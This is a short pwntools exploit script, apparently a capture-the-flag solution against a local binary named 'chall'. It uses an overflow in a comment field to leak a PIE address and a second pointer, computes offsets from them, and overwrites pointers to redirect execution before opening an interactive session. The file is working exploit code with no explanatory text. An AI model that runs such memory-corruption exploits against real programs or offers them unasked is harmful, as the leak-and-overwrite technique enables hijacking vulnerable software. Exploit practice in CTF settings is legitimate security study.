from pwn import *

p = process('./chall')
#p = remote('127.0.0.1', 7272)

p.sendlineafter(b'> ', b'2')
p.sendline(b'azod')
p.sendline(b'azod')

p.sendlineafter(b'> ', b'3')
p.sendline(b'3')
p.sendline(b'a'*40)

p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Comment: ')
pie = int(p.recvline()[40:-1][::-1].hex(), 16) # - 0x50a8
print(hex(pie))

p.sendline(b'3')
p.sendline(b'4')
p.send(b'a'*8)

#pause()
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Comment: ')
#p.recvline(2048)
leak = int(p.recvline()[48:-1][::-1].hex(), 16) - 0x1139
print(hex(leak))
#win = leak + 0x1179

p.sendline(b'3')
p.sendline(b'4')
#pause()
p.sendline(p64(pie) + p64(leak + 0x1494))

p.interactive()
